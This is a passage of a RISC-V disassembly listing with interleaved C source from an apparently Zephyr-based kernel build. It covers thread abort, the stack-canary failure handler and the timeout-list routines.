80005c20:	4788                	lw	a0,8(a5)
}
80005c22:	46b2                	lw	a3,12(sp)
80005c24:	95072783          	lw	a5,-1712(a4)
80005c28:	8fb5                	xor	a5,a5,a3
80005c2a:	4681                	li	a3,0
80005c2c:	e781                	bnez	a5,80005c34 <z_impl_z_current_get+0x2c>
80005c2e:	40f2                	lw	ra,28(sp)
80005c30:	6105                	addi	sp,sp,32
80005c32:	8082                	ret
80005c34:	287d                	jal	80005cf2 <_StackCheckHandler>

80005c36 <z_thread_abort>:

void z_thread_abort(struct k_thread *thread)
{
80005c36:	1101                	addi	sp,sp,-32
80005c38:	ce06                	sw	ra,28(sp)
80005c3a:	cc22                	sw	s0,24(sp)
80005c3c:	ca26                	sw	s1,20(sp)
80005c3e:	8000c7b7          	lui	a5,0x8000c
80005c42:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005c46:	c63a                	sw	a4,12(sp)
80005c48:	4701                	li	a4,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80005c4a:	300474f3          	csrrci	s1,mstatus,8
	k_spinlock_key_t key = k_spin_lock(&sched_spinlock);

	if ((thread->base.user_options & K_ESSENTIAL) != 0) {
80005c4e:	00c54783          	lbu	a5,12(a0)
80005c52:	8b85                	andi	a5,a5,1
80005c54:	eb91                	bnez	a5,80005c68 <z_thread_abort+0x32>
80005c56:	842a                	mv	s0,a0
		__ASSERT(false, "aborting essential thread %p", thread);
		k_panic();
		return;
	}

	if ((thread->base.thread_state & _THREAD_DEAD) != 0U) {
80005c58:	00d54783          	lbu	a5,13(a0)
80005c5c:	8ba1                	andi	a5,a5,8
80005c5e:	cb8d                	beqz	a5,80005c90 <z_thread_abort+0x5a>
	__asm__ volatile ("csrs mstatus, %0"
80005c60:	88a1                	andi	s1,s1,8
80005c62:	3004a073          	csrs	mstatus,s1
		k_spin_unlock(&sched_spinlock, key);
		return;
80005c66:	a801                	j	80005c76 <z_thread_abort+0x40>
80005c68:	88a1                	andi	s1,s1,8
80005c6a:	3004a073          	csrs	mstatus,s1
	register unsigned long a0 __asm__ ("a0") = arg1;
80005c6e:	4511                	li	a0,4
	register unsigned long t0 __asm__ ("t0") = call_id;
80005c70:	4281                	li	t0,0
	__asm__ volatile ("ecall"
80005c72:	00000073          	ecall
	if (thread == _current && !arch_is_in_isr()) {
		z_swap(&sched_spinlock, key);
		__ASSERT(false, "aborted _current back from dead");
	}
	k_spin_unlock(&sched_spinlock, key);
}
80005c76:	8000c7b7          	lui	a5,0x8000c
80005c7a:	4732                	lw	a4,12(sp)
80005c7c:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005c80:	8fb9                	xor	a5,a5,a4
80005c82:	4701                	li	a4,0
80005c84:	e3a1                	bnez	a5,80005cc4 <z_thread_abort+0x8e>
80005c86:	40f2                	lw	ra,28(sp)
80005c88:	4462                	lw	s0,24(sp)
80005c8a:	44d2                	lw	s1,20(sp)
80005c8c:	6105                	addi	sp,sp,32
80005c8e:	8082                	ret
	end_thread(thread);
80005c90:	e1fff0ef          	jal	ra,80005aae <end_thread>
	if (thread == _current && !arch_is_in_isr()) {
80005c94:	800097b7          	lui	a5,0x80009
80005c98:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005c9c:	479c                	lw	a5,8(a5)
80005c9e:	00878663          	beq	a5,s0,80005caa <z_thread_abort+0x74>
80005ca2:	88a1                	andi	s1,s1,8
80005ca4:	3004a073          	csrs	mstatus,s1
80005ca8:	b7f9                	j	80005c76 <z_thread_abort+0x40>
80005caa:	800097b7          	lui	a5,0x80009
80005cae:	5207a783          	lw	a5,1312(a5) # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005cb2:	fbe5                	bnez	a5,80005ca2 <z_thread_abort+0x6c>
		z_swap(&sched_spinlock, key);
80005cb4:	85a6                	mv	a1,s1
80005cb6:	80009537          	lui	a0,0x80009
80005cba:	54450513          	addi	a0,a0,1348 # 80009544 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009545>
80005cbe:	c4aff0ef          	jal	ra,80005108 <z_swap>
80005cc2:	b7c5                	j	80005ca2 <z_thread_abort+0x6c>
}
80005cc4:	203d                	jal	80005cf2 <_StackCheckHandler>

80005cc6 <z_impl_k_thread_abort>:

#if !defined(CONFIG_ARCH_HAS_THREAD_ABORT)
void z_impl_k_thread_abort(struct k_thread *thread)
{
80005cc6:	1101                	addi	sp,sp,-32
80005cc8:	ce06                	sw	ra,28(sp)
80005cca:	cc22                	sw	s0,24(sp)
80005ccc:	8000c437          	lui	s0,0x8000c
80005cd0:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005cd4:	c63e                	sw	a5,12(sp)
80005cd6:	4781                	li	a5,0
	SYS_PORT_TRACING_OBJ_FUNC_ENTER(k_thread, abort, thread);

	z_thread_abort(thread);
80005cd8:	f5fff0ef          	jal	ra,80005c36 <z_thread_abort>

	SYS_PORT_TRACING_OBJ_FUNC_EXIT(k_thread, abort, thread);
}
80005cdc:	4732                	lw	a4,12(sp)
80005cde:	95042783          	lw	a5,-1712(s0)
80005ce2:	8fb9                	xor	a5,a5,a4
80005ce4:	4701                	li	a4,0
80005ce6:	e789                	bnez	a5,80005cf0 <z_impl_k_thread_abort+0x2a>
80005ce8:	40f2                	lw	ra,28(sp)
80005cea:	4462                	lw	s0,24(sp)
80005cec:	6105                	addi	sp,sp,32
80005cee:	8082                	ret
80005cf0:	2009                	jal	80005cf2 <_StackCheckHandler>

80005cf2 <_StackCheckHandler>:
 * This function is invoked when a stack canary error is detected.
 *
 * @return Does not return
 */
void _StackCheckHandler(void)
{
80005cf2:	1141                	addi	sp,sp,-16
80005cf4:	8000c7b7          	lui	a5,0x8000c
80005cf8:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005cfc:	c63a                	sw	a4,12(sp)
80005cfe:	4701                	li	a4,0
	register unsigned long a0 __asm__ ("a0") = arg1;
80005d00:	4509                	li	a0,2
	register unsigned long t0 __asm__ ("t0") = call_id;
80005d02:	4281                	li	t0,0
	__asm__ volatile ("ecall"
80005d04:	00000073          	ecall

80005d08 <first>:
#include <syscalls/sys_clock_hw_cycles_per_sec_runtime_get_mrsh.c>
#endif /* CONFIG_USERSPACE */
#endif /* CONFIG_TIMER_READS_ITS_FREQUENCY_AT_RUNTIME */

static struct _timeout *first(void)
{
80005d08:	1101                	addi	sp,sp,-32
80005d0a:	ce06                	sw	ra,28(sp)
80005d0c:	8000c7b7          	lui	a5,0x8000c
80005d10:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005d14:	c63a                	sw	a4,12(sp)
80005d16:	4701                	li	a4,0
	return list->head == list;
80005d18:	82418793          	addi	a5,gp,-2012 # 8000c00c <timeout_list>
80005d1c:	4388                	lw	a0,0(a5)
	return sys_dlist_is_empty(list) ? NULL : list->head;
80005d1e:	00f50d63          	beq	a0,a5,80005d38 <first+0x30>
	sys_dnode_t *t = sys_dlist_peek_head(&timeout_list);

	return t == NULL ? NULL : CONTAINER_OF(t, struct _timeout, node);
}
80005d22:	8000c7b7          	lui	a5,0x8000c
80005d26:	4732                	lw	a4,12(sp)
80005d28:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005d2c:	8fb9                	xor	a5,a5,a4
80005d2e:	4701                	li	a4,0
80005d30:	e791                	bnez	a5,80005d3c <first+0x34>
80005d32:	40f2                	lw	ra,28(sp)
80005d34:	6105                	addi	sp,sp,32
80005d36:	8082                	ret
80005d38:	4501                	li	a0,0
	return t == NULL ? NULL : CONTAINER_OF(t, struct _timeout, node);
80005d3a:	b7e5                	j	80005d22 <first+0x1a>
}
80005d3c:	fb7ff0ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005d40 <next>:

static struct _timeout *next(struct _timeout *t)
{
80005d40:	1101                	addi	sp,sp,-32
80005d42:	ce06                	sw	ra,28(sp)
80005d44:	8000c737          	lui	a4,0x8000c
80005d48:	95072683          	lw	a3,-1712(a4) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005d4c:	c636                	sw	a3,12(sp)
80005d4e:	4681                	li	a3,0
	return (node != NULL) ? sys_dlist_peek_next_no_check(list, node) : NULL;
80005d50:	c519                	beqz	a0,80005d5e <next+0x1e>
	return (node == list->tail) ? NULL : node->next;
80005d52:	82418713          	addi	a4,gp,-2012 # 8000c00c <timeout_list>
80005d56:	4358                	lw	a4,4(a4)
80005d58:	00e50e63          	beq	a0,a4,80005d74 <next+0x34>
80005d5c:	4108                	lw	a0,0(a0)
	sys_dnode_t *n = sys_dlist_peek_next(&timeout_list, &t->node);

	return n == NULL ? NULL : CONTAINER_OF(n, struct _timeout, node);
}
80005d5e:	8000c7b7          	lui	a5,0x8000c
80005d62:	4732                	lw	a4,12(sp)
80005d64:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005d68:	8fb9                	xor	a5,a5,a4
80005d6a:	4701                	li	a4,0
80005d6c:	e791                	bnez	a5,80005d78 <next+0x38>
80005d6e:	40f2                	lw	ra,28(sp)
80005d70:	6105                	addi	sp,sp,32
80005d72:	8082                	ret
80005d74:	4501                	li	a0,0
	return n == NULL ? NULL : CONTAINER_OF(n, struct _timeout, node);
80005d76:	b7e5                	j	80005d5e <next+0x1e>
}
80005d78:	f7bff0ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005d7c <remove_timeout>:

static void remove_timeout(struct _timeout *t)
{
80005d7c:	1101                	addi	sp,sp,-32
80005d7e:	ce06                	sw	ra,28(sp)
80005d80:	cc22                	sw	s0,24(sp)
80005d82:	842a                	mv	s0,a0
80005d84:	8000c7b7          	lui	a5,0x8000c
80005d88:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005d8c:	c63a                	sw	a4,12(sp)
80005d8e:	4701                	li	a4,0
	if (next(t) != NULL) {
80005d90:	fb1ff0ef          	jal	ra,80005d40 <next>
80005d94:	cd01                	beqz	a0,80005dac <remove_timeout+0x30>
		next(t)->dticks += t->dticks;
80005d96:	491c                	lw	a5,16(a0)
80005d98:	4954                	lw	a3,20(a0)
80005d9a:	4818                	lw	a4,16(s0)
80005d9c:	4850                	lw	a2,20(s0)
80005d9e:	973e                	add	a4,a4,a5
80005da0:	00f737b3          	sltu	a5,a4,a5
80005da4:	96b2                	add	a3,a3,a2
80005da6:	97b6                	add	a5,a5,a3
80005da8:	c918                	sw	a4,16(a0)
80005daa:	c95c                	sw	a5,20(a0)
	sys_dnode_t *const prev = node->prev;
80005dac:	4058                	lw	a4,4(s0)
	sys_dnode_t *const next = node->next;
80005dae:	401c                	lw	a5,0(s0)
	prev->next = next;
80005db0:	c31c                	sw	a5,0(a4)
	next->prev = prev;
80005db2:	c3d8                	sw	a4,4(a5)
	node->next = NULL;
80005db4:	00042023          	sw	zero,0(s0)
	node->prev = NULL;
80005db8:	00042223          	sw	zero,4(s0)
	}

	sys_dlist_remove(&t->node);
}
80005dbc:	8000c7b7          	lui	a5,0x8000c
80005dc0:	4732                	lw	a4,12(sp)
80005dc2:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005dc6:	8fb9                	xor	a5,a5,a4
80005dc8:	4701                	li	a4,0
80005dca:	e789                	bnez	a5,80005dd4 <remove_timeout+0x58>
80005dcc:	40f2                	lw	ra,28(sp)
80005dce:	4462                	lw	s0,24(sp)
80005dd0:	6105                	addi	sp,sp,32
80005dd2:	8082                	ret
80005dd4:	f1fff0ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005dd8 <elapsed>:

static int32_t elapsed(void)
{
80005dd8:	1101                	addi	sp,sp,-32
80005dda:	ce06                	sw	ra,28(sp)
80005ddc:	8000c7b7          	lui	a5,0x8000c
80005de0:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005de4:	c63a                	sw	a4,12(sp)
80005de6:	4701                	li	a4,0
	return announce_remaining == 0 ? sys_clock_elapsed() : 0U;
80005de8:	800097b7          	lui	a5,0x80009
80005dec:	0507a783          	lw	a5,80(a5) # 80009050 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009051>
80005df0:	cf89                	beqz	a5,80005e0a <elapsed+0x32>
80005df2:	4501                	li	a0,0
}
80005df4:	8000c7b7          	lui	a5,0x8000c
80005df8:	4732                	lw	a4,12(sp)
80005dfa:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005dfe:	8fb9                	xor	a5,a5,a4
80005e00:	4701                	li	a4,0
80005e02:	e799                	bnez	a5,80005e10 <elapsed+0x38>
80005e04:	40f2                	lw	ra,28(sp)
80005e06:	6105                	addi	sp,sp,32
80005e08:	8082                	ret
	return announce_remaining == 0 ? sys_clock_elapsed() : 0U;
80005e0a:	c46fe0ef          	jal	ra,80004250 <sys_clock_elapsed>
80005e0e:	b7dd                	j	80005df4 <elapsed+0x1c>
}
80005e10:	ee3ff0ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005e14 <next_timeout>:

static int32_t next_timeout(void)
{
80005e14:	1101                	addi	sp,sp,-32
80005e16:	ce06                	sw	ra,28(sp)
80005e18:	cc22                	sw	s0,24(sp)
80005e1a:	8000c7b7          	lui	a5,0x8000c
80005e1e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005e22:	c63a                	sw	a4,12(sp)
80005e24:	4701                	li	a4,0
	struct _timeout *to = first();
80005e26:	ee3ff0ef          	jal	ra,80005d08 <first>
80005e2a:	842a                	mv	s0,a0
	int32_t ticks_elapsed = elapsed();
80005e2c:	fadff0ef          	jal	ra,80005dd8 <elapsed>
	int32_t ret;

	if ((to == NULL) ||
80005e30:	c405                	beqz	s0,80005e58 <next_timeout+0x44>
	    ((int64_t)(to->dticks - ticks_elapsed) > (int64_t)INT_MAX)) {
80005e32:	4818                	lw	a4,16(s0)
80005e34:	485c                	lw	a5,20(s0)
80005e36:	41f55693          	srai	a3,a0,0x1f
80005e3a:	40a70533          	sub	a0,a4,a0
80005e3e:	00a73733          	sltu	a4,a4,a0
80005e42:	8f95                	sub	a5,a5,a3
80005e44:	8f99                	sub	a5,a5,a4
	if ((to == NULL) ||
80005e46:	00f04e63          	bgtz	a5,80005e62 <next_timeout+0x4e>
80005e4a:	e399                	bnez	a5,80005e50 <next_timeout+0x3c>
80005e4c:	00054b63          	bltz	a0,80005e62 <next_timeout+0x4e>
		ret = MAX_WAIT;
	} else {
		ret = MAX(0, to->dticks - ticks_elapsed);
80005e50:	0007dd63          	bgez	a5,80005e6a <next_timeout+0x56>
80005e54:	4501                	li	a0,0
80005e56:	a811                	j	80005e6a <next_timeout+0x56>
		ret = MAX_WAIT;
80005e58:	80000537          	lui	a0,0x80000
80005e5c:	fff54513          	not	a0,a0
80005e60:	a029                	j	80005e6a <next_timeout+0x56>
80005e62:	80000537          	lui	a0,0x80000
80005e66:	fff54513          	not	a0,a0
	}

#ifdef CONFIG_TIMESLICING
	if (_current_cpu->slice_ticks && _current_cpu->slice_ticks < ret) {
80005e6a:	800097b7          	lui	a5,0x80009
80005e6e:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005e72:	4b9c                	lw	a5,16(a5)
80005e74:	c781                	beqz	a5,80005e7c <next_timeout+0x68>
80005e76:	00a7d363          	bge	a5,a0,80005e7c <next_timeout+0x68>
		ret = _current_cpu->slice_ticks;
80005e7a:	853e                	mv	a0,a5
	}
#endif
	return ret;
}
80005e7c:	8000c7b7          	lui	a5,0x8000c
80005e80:	4732                	lw	a4,12(sp)
80005e82:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005e86:	8fb9                	xor	a5,a5,a4
80005e88:	4701                	li	a4,0
80005e8a:	e789                	bnez	a5,80005e94 <next_timeout+0x80>
80005e8c:	40f2                	lw	ra,28(sp)
80005e8e:	4462                	lw	s0,24(sp)
80005e90:	6105                	addi	sp,sp,32
80005e92:	8082                	ret
80005e94:	e5fff0ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005e98 <z_add_timeout>:

void z_add_timeout(struct _timeout *to, _timeout_func_t fn,
		   k_timeout_t timeout)
{
80005e98:	7179                	addi	sp,sp,-48
80005e9a:	d606                	sw	ra,44(sp)
80005e9c:	d422                	sw	s0,40(sp)
80005e9e:	d226                	sw	s1,36(sp)
80005ea0:	d04a                	sw	s2,32(sp)
80005ea2:	ce4e                	sw	s3,28(sp)
80005ea4:	cc52                	sw	s4,24(sp)
80005ea6:	ca56                	sw	s5,20(sp)
80005ea8:	842a                	mv	s0,a0
80005eaa:	84b2                	mv	s1,a2
80005eac:	8936                	mv	s2,a3
80005eae:	8000c7b7          	lui	a5,0x8000c
80005eb2:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005eb6:	c63a                	sw	a4,12(sp)
80005eb8:	4701                	li	a4,0
	if (K_TIMEOUT_EQ(timeout, K_FOREVER)) {
80005eba:	57fd                	li	a5,-1
80005ebc:	00c78763          	beq	a5,a2,80005eca <z_add_timeout+0x32>
#ifdef CONFIG_KERNEL_COHERENCE
	__ASSERT_NO_MSG(arch_mem_coherent(to));
#endif

	__ASSERT(!sys_dnode_is_linked(&to->node), "");
	to->fn = fn;
80005ec0:	c40c                	sw	a1,8(s0)

	LOCKED(&timeout_lock) {
80005ec2:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80005ec4:	300479f3          	csrrci	s3,mstatus,8
80005ec8:	a0c1                	j	80005f88 <z_add_timeout+0xf0>
	if (K_TIMEOUT_EQ(timeout, K_FOREVER)) {
80005eca:	fef69be3          	bne	a3,a5,80005ec0 <z_add_timeout+0x28>
#else
			sys_clock_set_timeout(next_timeout(), false);
#endif	/* CONFIG_TIMESLICING */
		}
	}
}
80005ece:	8000c7b7          	lui	a5,0x8000c
80005ed2:	4732                	lw	a4,12(sp)
80005ed4:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005ed8:	8fb9                	xor	a5,a5,a4
80005eda:	4701                	li	a4,0
80005edc:	10079963          	bnez	a5,80005fee <z_add_timeout+0x156>
80005ee0:	50b2                	lw	ra,44(sp)
80005ee2:	5422                	lw	s0,40(sp)
80005ee4:	5492                	lw	s1,36(sp)
80005ee6:	5902                	lw	s2,32(sp)
80005ee8:	49f2                	lw	s3,28(sp)
80005eea:	4a62                	lw	s4,24(sp)
80005eec:	4ad2                	lw	s5,20(sp)
80005eee:	6145                	addi	sp,sp,48
80005ef0:	8082                	ret
			to->dticks = MAX(1, ticks);
80005ef2:	e311                	bnez	a4,80005ef6 <z_add_timeout+0x5e>
80005ef4:	ebf1                	bnez	a5,80005fc8 <z_add_timeout+0x130>
80005ef6:	4785                	li	a5,1
80005ef8:	4701                	li	a4,0
80005efa:	a0f9                	j	80005fc8 <z_add_timeout+0x130>
			to->dticks = timeout.ticks + 1 + elapsed();
80005efc:	00148a13          	addi	s4,s1,1
80005f00:	009a3ab3          	sltu	s5,s4,s1
80005f04:	9aca                	add	s5,s5,s2
80005f06:	ed3ff0ef          	jal	ra,80005dd8 <elapsed>
80005f0a:	41f55713          	srai	a4,a0,0x1f
80005f0e:	00aa07b3          	add	a5,s4,a0
80005f12:	0147ba33          	sltu	s4,a5,s4
80005f16:	9aba                	add	s5,s5,a4
80005f18:	9a56                	add	s4,s4,s5
80005f1a:	c81c                	sw	a5,16(s0)
80005f1c:	01442a23          	sw	s4,20(s0)
80005f20:	a075                	j	80005fcc <z_add_timeout+0x134>
			to->dticks -= t->dticks;
80005f22:	40d706b3          	sub	a3,a4,a3
80005f26:	00d73733          	sltu	a4,a4,a3
80005f2a:	8f91                	sub	a5,a5,a2
80005f2c:	8f99                	sub	a5,a5,a4
80005f2e:	c814                	sw	a3,16(s0)
80005f30:	c85c                	sw	a5,20(s0)
		for (t = first(); t != NULL; t = next(t)) {
80005f32:	e0fff0ef          	jal	ra,80005d40 <next>
80005f36:	c90d                	beqz	a0,80005f68 <z_add_timeout+0xd0>
			if (t->dticks > to->dticks) {
80005f38:	4914                	lw	a3,16(a0)
80005f3a:	4950                	lw	a2,20(a0)
80005f3c:	4818                	lw	a4,16(s0)
80005f3e:	485c                	lw	a5,20(s0)
80005f40:	00c7c663          	blt	a5,a2,80005f4c <z_add_timeout+0xb4>
80005f44:	fcf61fe3          	bne	a2,a5,80005f22 <z_add_timeout+0x8a>
80005f48:	fcd77de3          	bgeu	a4,a3,80005f22 <z_add_timeout+0x8a>
				t->dticks -= to->dticks;
80005f4c:	40e68733          	sub	a4,a3,a4
80005f50:	00e6b6b3          	sltu	a3,a3,a4
80005f54:	8e1d                	sub	a2,a2,a5
80005f56:	8e15                	sub	a2,a2,a3
80005f58:	c918                	sw	a4,16(a0)
80005f5a:	c950                	sw	a2,20(a0)
	sys_dnode_t *const prev = successor->prev;
80005f5c:	415c                	lw	a5,4(a0)
	node->prev = prev;
80005f5e:	c05c                	sw	a5,4(s0)
	node->next = successor;
80005f60:	c008                	sw	a0,0(s0)
	prev->next = node;
80005f62:	c380                	sw	s0,0(a5)
	successor->prev = node;
80005f64:	c140                	sw	s0,4(a0)
		if (t == NULL) {
80005f66:	a801                	j	80005f76 <z_add_timeout+0xde>
	sys_dnode_t *const tail = list->tail;
80005f68:	82418793          	addi	a5,gp,-2012 # 8000c00c <timeout_list>
80005f6c:	43d8                	lw	a4,4(a5)
	node->next = list;
80005f6e:	c01c                	sw	a5,0(s0)
	node->prev = tail;
80005f70:	c058                	sw	a4,4(s0)
	tail->next = node;
80005f72:	c300                	sw	s0,0(a4)
	list->tail = node;
80005f74:	c3c0                	sw	s0,4(a5)
		if (to == first()) {
80005f76:	d93ff0ef          	jal	ra,80005d08 <first>
80005f7a:	04a40c63          	beq	s0,a0,80005fd2 <z_add_timeout+0x13a>
			  : "r" (key & MSTATUS_IEN)
80005f7e:	0089f793          	andi	a5,s3,8
	__asm__ volatile ("csrs mstatus, %0"
80005f82:	3007a073          	csrs	mstatus,a5
	LOCKED(&timeout_lock) {
80005f86:	4785                	li	a5,1
80005f88:	f3b9                	bnez	a5,80005ece <z_add_timeout+0x36>
		    Z_TICK_ABS(timeout.ticks) >= 0) {
80005f8a:	57f9                	li	a5,-2
80005f8c:	40978733          	sub	a4,a5,s1
80005f90:	00e7b733          	sltu	a4,a5,a4
80005f94:	fff94793          	not	a5,s2
80005f98:	8f99                	sub	a5,a5,a4
		if (IS_ENABLED(CONFIG_TIMEOUT_64BIT) &&
80005f9a:	f607c1e3          	bltz	a5,80005efc <z_add_timeout+0x64>
			k_ticks_t ticks = Z_TICK_ABS(timeout.ticks) - curr_tick;
80005f9e:	80009737          	lui	a4,0x80009
80005fa2:	00872783          	lw	a5,8(a4) # 80009008 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009009>
80005fa6:	00c72683          	lw	a3,12(a4)
80005faa:	97a6                	add	a5,a5,s1
80005fac:	0097b733          	sltu	a4,a5,s1
80005fb0:	96ca                	add	a3,a3,s2
80005fb2:	9736                	add	a4,a4,a3
80005fb4:	56f9                	li	a3,-2
80005fb6:	40f687b3          	sub	a5,a3,a5
80005fba:	00f6b6b3          	sltu	a3,a3,a5
80005fbe:	fff74713          	not	a4,a4
			to->dticks = MAX(1, ticks);
80005fc2:	8f15                	sub	a4,a4,a3
80005fc4:	f2e057e3          	blez	a4,80005ef2 <z_add_timeout+0x5a>
80005fc8:	c81c                	sw	a5,16(s0)
80005fca:	c858                	sw	a4,20(s0)
		for (t = first(); t != NULL; t = next(t)) {
80005fcc:	d3dff0ef          	jal	ra,80005d08 <first>
80005fd0:	b79d                	j	80005f36 <z_add_timeout+0x9e>
			int32_t next_time = next_timeout();
80005fd2:	e43ff0ef          	jal	ra,80005e14 <next_timeout>
			if (next_time == 0 ||
80005fd6:	c901                	beqz	a0,80005fe6 <z_add_timeout+0x14e>
			    _current_cpu->slice_ticks != next_time) {
80005fd8:	800097b7          	lui	a5,0x80009
80005fdc:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005fe0:	4b9c                	lw	a5,16(a5)
			if (next_time == 0 ||
80005fe2:	f8a78ee3          	beq	a5,a0,80005f7e <z_add_timeout+0xe6>
				sys_clock_set_timeout(next_time, false);
80005fe6:	4581                	li	a1,0
80005fe8:	990fe0ef          	jal	ra,80004178 <sys_clock_set_timeout>
80005fec:	bf49                	j	80005f7e <z_add_timeout+0xe6>
}
80005fee:	d05ff0ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005ff2 <z_abort_timeout>:

int z_abort_timeout(struct _timeout *to)
{
80005ff2:	1101                	addi	sp,sp,-32
80005ff4:	ce06                	sw	ra,28(sp)
80005ff6:	cc22                	sw	s0,24(sp)
80005ff8:	ca26                	sw	s1,20(sp)
80005ffa:	c84a                	sw	s2,16(sp)
80005ffc:	84aa                	mv	s1,a0
80005ffe:	8000c7b7          	lui	a5,0x8000c
80006002:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80006006:	c63a                	sw	a4,12(sp)
80006008:	4701                	li	a4,0
	int ret = -EINVAL;

	LOCKED(&timeout_lock) {
8000600a:	4401                	li	s0,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
8000600c:	30047973          	csrrci	s2,mstatus,8
	int ret = -EINVAL;
80006010:	5529                	li	a0,-22
80006012:	a031                	j	8000601e <z_abort_timeout+0x2c>
			  : "r" (key & MSTATUS_IEN)
80006014:	00897793          	andi	a5,s2,8
	__asm__ volatile ("csrs mstatus, %0"
80006018:	3007a073          	csrs	mstatus,a5
	LOCKED(&timeout_lock) {
8000601c:	4405                	li	s0,1
8000601e:	e801                	bnez	s0,8000602e <z_abort_timeout+0x3c>
	return node->next != NULL;
80006020:	409c                	lw	a5,0(s1)
		if (sys_dnode_is_linked(&to->node)) {
80006022:	dbed                	beqz	a5,80006014 <z_abort_timeout+0x22>
			remove_timeout(to);
80006024:	8526                	mv	a0,s1
80006026:	d57ff0ef          	jal	ra,80005d7c <remove_timeout>
			ret = 0;
8000602a:	8522                	mv	a0,s0
8000602c:	b7e5                	j	80006014 <z_abort_timeout+0x22>
		}
	}

	return ret;
}
8000602e:	8000c7b7          	lui	a5,0x8000c
80006032:	4732                	lw	a4,12(sp)
80006034:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80006038:	8fb9                	xor	a5,a5,a4
8000603a:	4701                	li	a4,0
8000603c:	e799                	bnez	a5,8000604a <z_abort_timeout+0x58>
8000603e:	40f2                	lw	ra,28(sp)
80006040:	4462                	lw	s0,24(sp)
80006042:	44d2                	lw	s1,20(sp)
80006044:	4942                	lw	s2,16(sp)
80006046:	6105                	addi	sp,sp,32
80006048:	8082                	ret
8000604a:	ca9ff0ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000604e <z_set_timeout_expiry>:
	}
	return ret;
}

void z_set_timeout_expiry(int32_t ticks, bool is_idle)
{
8000604e:	7179                	addi	sp,sp,-48
80006050:	d606                	sw	ra,44(sp)
80006052:	d422                	sw	s0,40(sp)
80006054:	d226                	sw	s1,36(sp)
80006056:	d04a                	sw	s2,32(sp)
80006058:	ce4e                	sw	s3,28(sp)
8000605a:	84aa                	mv	s1,a0
8000605c:	89ae                	mv	s3,a1
8000605e:	8000c7b7          	lui	a5,0x8000c
80006062:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80006066:	c63a                	sw	a4,12(sp)
80006068:	4701                	li	a4,0
	LOCKED(&timeout_lock) {
8000606a:	4401                	li	s0,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
8000606c:	30047973          	csrrci	s2,mstatus,8
80006070:	a821                	j	80006088 <z_set_timeout_expiry+0x3a>
		int next_to = next_timeout();
		bool sooner = (next_to == K_TICKS_FOREVER)
			      || (ticks <= next_to);
80006072:	4405                	li	s0,1
		bool sooner = (next_to == K_TICKS_FOREVER)
80006074:	8805                	andi	s0,s0,1
		 * SMP can't use this optimization though: we don't
		 * know when context switches happen until interrupt
		 * exit and so can't get the timeslicing clamp folded
		 * in.
		 */
		if (!imminent && (sooner || IS_ENABLED(CONFIG_SMP))) {
80006076:	4785                	li	a5,1
80006078:	00a7d363          	bge	a5,a0,8000607e <z_set_timeout_expiry+0x30>
8000607c:	e005                	bnez	s0,8000609c <z_set_timeout_expiry+0x4e>
			  : "r" (key & MSTATUS_IEN)
8000607e:	00897793          	andi	a5,s2,8
	__asm__ volatile ("csrs mstatus, %0"
